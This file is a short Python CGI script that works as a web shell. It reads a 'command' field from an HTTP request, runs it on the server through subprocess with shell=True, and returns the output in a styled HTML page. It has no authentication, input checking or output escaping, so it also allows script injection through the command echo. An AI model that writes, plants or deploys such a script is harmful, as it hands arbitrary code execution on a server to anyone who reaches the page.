#!/usr/bin/env python3

import cgi
import cgitb
import subprocess

# Enable CGI traceback for debugging
cgitb.enable()

# Print necessary headers
print("Content-Type: text/html\n")

form = cgi.FieldStorage()
command = form.getvalue("command")

try:
    output = subprocess.check_output(command, shell=True, text=True)
    result = f"<pre class='bg-gray-100 p-4 rounded-lg'>{output}</pre>"
except Exception as e:
    result = f"<pre class='bg-red-100 p-4 rounded-lg'>Error: {str(e)}</pre>"

print(f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Output</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {{
            font-family: 'Arial', sans-serif;
        }}
    </style>
</head>
<body class="bg-gray-200 flex items-center justify-center min-h-screen text-gray-900">
    <div class="bg-white p-8 rounded-lg shadow-lg max-w-2xl w-full">
        <h1 class="text-2xl font-bold mb-6 text-center">Command: {command}</h1>
        <div>{result}</div>
    </div>
</body>
</html>
""")

